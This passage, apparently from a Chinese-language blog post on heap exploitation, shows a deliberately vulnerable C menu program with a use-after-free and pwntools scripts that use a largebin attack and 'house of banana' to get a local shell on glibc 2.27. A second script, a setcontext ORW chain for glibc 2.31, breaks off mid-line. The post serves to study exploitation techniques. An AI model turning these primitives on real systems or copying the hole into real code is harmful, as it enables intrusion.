class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//gcc test.c -o test -w -g</span></span><br><span class="line"><span class="comment">//ubuntu 18.04     GLIBC 2.27-3ubuntu1.6</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> num 10</span></span><br><span class="line"><span class="type">void</span> *chunk_list[num];</span><br><span class="line"><span class="type">int</span> chunk_size[num];</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">menu</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;1.add&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;2.show&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;3.edit&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;4.delete&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;5.exit&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Your choice:&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">add</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> index,size;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;index:&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;index);</span><br><span class="line"><span class="keyword">if</span>(index&lt;<span class="number">0</span> || index&gt;=num)</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Size:&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;size);</span><br><span class="line"><span class="keyword">if</span>(size&lt;<span class="number">0x80</span>||size&gt;<span class="number">0x500</span>)</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">chunk_list[index] = <span class="built_in">calloc</span>(size,<span class="number">1</span>);</span><br><span class="line">  chunk_size[index] = size;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">edit</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> index;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;index:&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;index);</span><br><span class="line"><span class="keyword">if</span>(index&lt;<span class="number">0</span> || index&gt;=num)</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;context: &quot;</span>);</span><br><span class="line">read(<span class="number">0</span>,chunk_list[index],chunk_size[index]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">delete</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> index;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;index:&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;index);</span><br><span class="line"><span class="keyword">if</span>(index&lt;<span class="number">0</span> || index&gt;=num)</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(chunk_list[index]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">show</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> index;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;index:&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;index);</span><br><span class="line"><span class="keyword">if</span>(index&lt;<span class="number">0</span> || index&gt;=num)</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;context: &quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(chunk_list[index]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> choice;</span><br><span class="line">init();</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">menu();</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;choice);</span><br><span class="line"><span class="keyword">if</span>(choice==<span class="number">5</span>)&#123;</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(choice==<span class="number">1</span>)&#123;</span><br><span class="line">add();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(choice==<span class="number">2</span>)&#123;</span><br><span class="line">show();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(choice==<span class="number">3</span>)&#123;</span><br><span class="line">edit();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(choice==<span class="number">4</span>)&#123;</span><br><span class="line">delete();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>根据这个编译为<code>glibc2.27</code>，<code>largebin attack</code>打<code>house of banana</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">filename = <span class="string">&quot;pwn_patched&quot;</span></span><br><span class="line">libcname = <span class="string">&quot;/home/r3t2/.config/cpwn/pkgs/2.27-3ubuntu1.6/amd64/libc6_2.27-3ubuntu1.6_amd64/lib/x86_64-linux-gnu/libc.so.6&quot;</span></span><br><span class="line">host = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">port = <span class="number">1337</span></span><br><span class="line">elf = context.binary = ELF(filename)</span><br><span class="line"><span class="keyword">if</span> libcname:</span><br><span class="line">    libc = ELF(libcname)</span><br><span class="line">gs = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">b main</span></span><br><span class="line"><span class="string">set debug-file-directory /home/r3t2/.config/cpwn/pkgs/2.27-3ubuntu1.6/amd64/libc6-dbg_2.27-3ubuntu1.6_amd64/usr/lib/debug</span></span><br><span class="line"><span class="string">set directories /home/r3t2/.config/cpwn/pkgs/2.27-3ubuntu1.6/amd64/glibc-source_2.27-3ubuntu1.6_all/usr/src/glibc/glibc-2.27</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>():</span><br><span class="line">    <span class="keyword">if</span> args.P:</span><br><span class="line">        <span class="keyword">return</span> process(elf.path)</span><br><span class="line">    <span class="keyword">elif</span> args.R:</span><br><span class="line">        <span class="keyword">return</span> remote(host, port)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> gdb.debug(elf.path, gdbscript = gs)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Your choice:\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;index:\n&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Size:\n&quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Your choice:\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;index:\n&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Your choice:\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;index:\n&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    io.sendafter(<span class="string">&quot;context: \n&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Your choice:\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;index:\n&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    add(<span class="number">0</span>, <span class="number">0x428</span>)</span><br><span class="line">    add(<span class="number">1</span>, <span class="number">0x500</span>)</span><br><span class="line">    add(<span class="number">2</span>, <span class="number">0x418</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    add(<span class="number">3</span>, <span class="number">0x500</span>)</span><br><span class="line">    show(<span class="number">0</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;context: \n&#x27;</span>)</span><br><span class="line">    libc_base = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span> , <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x3ec090</span></span><br><span class="line"></span><br><span class="line">    edit(<span class="number">0</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">    show(<span class="number">0</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">    heap_base = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x250</span></span><br><span class="line"></span><br><span class="line">    log.info(<span class="string">&quot;libc_base --&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">    log.info(<span class="string">&quot;heap_base --&gt; &quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">    rtld_global = libc_base + <span class="number">0x62a060</span></span><br><span class="line">    <span class="comment">#link_map3 = libc_base + 0x7f7018 </span></span><br><span class="line">    one_gadget = libc_base + <span class="number">0x4f302</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    edit(<span class="number">0</span>, p64(libc_base+<span class="number">0x3ec090</span>)*<span class="number">2</span> + p64(heap_base+<span class="number">0x250</span>) + p64(rtld_global-<span class="number">0x20</span>))</span><br><span class="line">    add(<span class="number">4</span>, <span class="number">0x500</span>)</span><br><span class="line"></span><br><span class="line">    chunk_addr = heap_base + <span class="number">0xb90</span></span><br><span class="line">    log.info(<span class="string">&quot;chunk_addr --&gt; &quot;</span>+<span class="built_in">hex</span>(chunk_addr))</span><br><span class="line">    link_map = p64(<span class="number">0</span>)</span><br><span class="line">    link_map = link_map.ljust(<span class="number">0x18</span> - <span class="number">0x10</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(libc_base + <span class="number">0x62b710</span>)</span><br><span class="line">    link_map = link_map.ljust(<span class="number">0x28</span> - <span class="number">0x10</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(chunk_addr)</span><br><span class="line">    link_map = link_map.ljust(<span class="number">0x40</span> - <span class="number">0x10</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(<span class="number">0x1a</span>) + p64(chunk_addr + <span class="number">0x58</span>)</span><br><span class="line">    link_map = link_map.ljust(<span class="number">0x58</span> - <span class="number">0x10</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(one_gadget)</span><br><span class="line">    link_map = link_map.ljust(<span class="number">0x60</span> - <span class="number">0x10</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(<span class="number">0x1c</span>) + p64(<span class="number">0x8</span>)</span><br><span class="line">    link_map = link_map.ljust(<span class="number">0x110</span> - <span class="number">0x10</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(chunk_addr + <span class="number">0x40</span>) </span><br><span class="line">    link_map = link_map.ljust(<span class="number">0x120</span> - <span class="number">0x10</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(chunk_addr + <span class="number">0x60</span>)</span><br><span class="line">    link_map = link_map.ljust(<span class="number">0x314</span> - <span class="number">0x10</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p8(<span class="number">0x8</span>) <span class="comment">#此版本l_init_called所处的unsignd int空间的偏移为0x314</span></span><br><span class="line"></span><br><span class="line">    edit(<span class="number">2</span>, link_map)</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Your choice:\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">5</span>))</span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line">pwn()</span><br></pre></td></tr></table></figure><p>最后成功getshell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ whoami</span><br><span class="line">[DEBUG] Sent 0x7 bytes:</span><br><span class="line">    b&#x27;whoami\n&#x27;</span><br><span class="line">[DEBUG] Received 0x5 bytes:</span><br><span class="line">    b&#x27;r3t2\n&#x27;</span><br><span class="line">r3t2</span><br><span class="line">$</span><br></pre></td></tr></table></figure><p>这里因为是打本地，所以似乎没有爆破的需要。然后在高版本还可以打一个<code>orw</code>，利用 <code>setcontext</code> <br>编译为<code>glibc2.31</code>打<code>orw</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">filename = <span class="string">&quot;pwn_patched&quot;</span></span><br><span class="line">libcname = <span class="string">&quot;/home/r3t2/.config/cpwn/pkgs/2.31-0ubuntu9.18/amd64/libc6_2.31-0ubuntu9.18_amd64/lib/x86_64-linux-gnu/libc.so.6&quot;</span></span><br><span class="line">host = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">port = <span class="number">1337</span></span><br><span class="line">elf = context.binary = ELF(filename)</span><br><span class="line"><span class="keyword">if</span> libcname:</span><br><span class="line">    libc = ELF(libcname)</span><br><span class="line">gs = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">b main</span></span><br><span class="line"><span class="string">set debug-file-directory /home/r3t2/.config/cpwn/pkgs/2.31-0ubuntu9.18/amd64/libc6-dbg_2.31-0ubuntu9.18_amd64/usr/lib/debug</span></span><br><span class="line"><span class="string">set directories /home/r3t2/.config/cpwn/pkgs/2.31-0ubuntu9.18/amd64/glibc-source_2.31-0ubuntu9.18_all/usr/src/glibc/glibc-2.31</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>():</span><br><span class="line">    <span class="keyword">if</span> args.P:</span><br><span class="line">        <span class="keyword">return</span> process(elf.path)</span><br><span class="line">    <span class="keyword">elif</span> args.R:</span><br><span class="line">        <span class="keyword">return</span> remote(host, port)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> gdb.debug(elf.path, gdbscript = gs)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>():</span><br><span class="line">    <span class="keyword">if</span> args.P:</span><br><span class="line">        <span class="keyword">return</span> process(elf.path)</span><br><span class="line">    <span class="keyword">elif</span> args.R:</span><br><span class="line">        <span class="keyword">return</span> remote(host, port)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> gdb.debug(elf.path, gdbscript = gs)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Your choice:\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;index:\n&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Size:\n&quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Your choice:\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;index:\n&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Your choice:\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;index:\n&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    io.sendafter(<span class="string">&quot;context: \n&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Your choice:\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;index:\n&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>() :</span><br><span class="line">    add(<span class="number">0</span>, <span class="number">0x428</span>)</span><br><span class="line">    add(<span class="number">1</span>, <span class="number">0x500</span>)</span><br><span class="line">    add(<span class="number">2</span>, <span class="number">0x418</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    show(<span class="number">0</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;context: \n&#x27;</span>)</span><br><span class="line">    libc_base = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span> , <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">96</span> - <span class="number">0x1ecb80</span></span><br><span class="line"></span><br><span class="line">    add(<span class="number">3</span>, <span class="number">0x500</span>)</span><br><span class="line">    edit(<span class="number">0</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">    show(<span class="number">0</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">    heap_base = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x290</span></span><br><span class="line"></span><br><span class="line">    log.info(<span class="string">&quot;libc_base --&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">    log.info(<span class="string">&quot;heap_base --&gt; &quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">    rtld_global = libc_base + <span class="number">0x228060</span> <span class="comment"># 0x222060则不需要爆破，同时l_next修改为0x223740</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#link_map3 = libc_base + 0x7f7018 </span></span><br><span class="line">    <span class="comment">#one_gadget = libc_base + 0x4f302</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">open</span> = libc_base + libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">    read = libc_base + libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">    write = libc_base + libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">    pop_rdi_ret = libc_base + <span class="number">0x23b6a</span></span><br><span class="line">    pop_rsi_ret = libc_base + <span class="number">0x2601f</span></span><br><span class="line">    pop_rdx_r12_ret = libc_base + <span class="number">0x119431</span></span><br><span class="line">    setcontext = libc_base + libc.sym[<span class="string">&#x27;setcontext&#x27;</span>]</span><br><span class="line">    ret = libc_base + <span class="number">0x22679</span> </span><br><span class="line"></span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    edit(<span class="number">0</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span> + p64(rtld_global-<span class="number">0x20</span>))</span><br><span class="line">    add(<span class="number">4</span>, <span class="number">0x500</span>)</span><br><span class="line"></span><br><span class="line">    chunk_addr = heap_base + <span class="number">0xb90</span>+<span class="number">0x40</span></span><br><span class="line">    log.info(<span class="string">&quot;chunk_addr --&gt; &quot;</span>+<span class="built_in">hex</span>(chunk_addr))</span><br><span class="line">    link_map = p64(<span class="number">0</span>)</span><br><span class="line">    link_map = link_map.ljust(<span class="number">0x18</span> - <span class="number">0x10</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(libc_base + <span class="number">0x229740</span>) <span class="comment"># l_next </span></span><br><span class="line">    link_map = link_map.ljust(<span class="number">0x28</span> - <span class="number">0x10</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(chunk_addr) <span class="comment"># l_real</span></span><br><span class="line">    link_map = link_map.ljust(<span class="number">0x40</span> - <span class="number">0x10</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(<span class="number">0x1a</span>) + p64(chunk_addr + <span class="number">0x1f8</span>)</span><br><span class="line">    link_map = link_map.ljust(<span class="number">0x60</span> - <span class="number">0x10</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(<span class="number">0x1c</span>) + p64(<span class="number">0x10</span>)</span><br><span class="line">    link_map = link_map.ljust(<span class="number">0x110</span> - <span class="number">0x10</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(chunk_addr + <span class="number">0x40</span>) <span class="comment"># l_info[26]</span></span><br><span class="line">    link_map = link_map.ljust(<span class="number">0x120</span> - <span class="number">0x10</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(chunk_addr + <span class="number">0x60</span>) <span class="comment"># l_info[28]</span></span><br><span class="line">    link_map = link_map.ljust(<span class="number">0x1f8</span> - <span class="number">0x10</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(setcontext+<span class="number">61</span>) + p64(ret) <span class="comment">#这里的ret所被布置地址会被赋给rdx，也就是chunk_addr + 0x200</span></span><br><span class="line">    link_map = link_map.ljust(<span class="number">0x200</span> - <span class="number">0x10</span> + <span class="number">0x68</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(chunk_addr + <span class="number">0x330</span>) <span class="comment">#rdi</span></span><br><span class="line">    link_map = link_map.ljust(<span class="number">0x200</span> - <span class="number">0x10</span> + <span class="number">0x70</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(<span class="number">0</span>) <span class="comment">#rsi</span></span><br><span class="line">    link_map = link_map.ljust(<span class="number">0x200</span> - <span class="number">0x10</span> + <span class="number">0xa0</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(chunk_addr + <span class="number">0x350</span>) <span class="comment">#rsp</span></span><br><span class="line">    link_map = link_map.ljust(<span 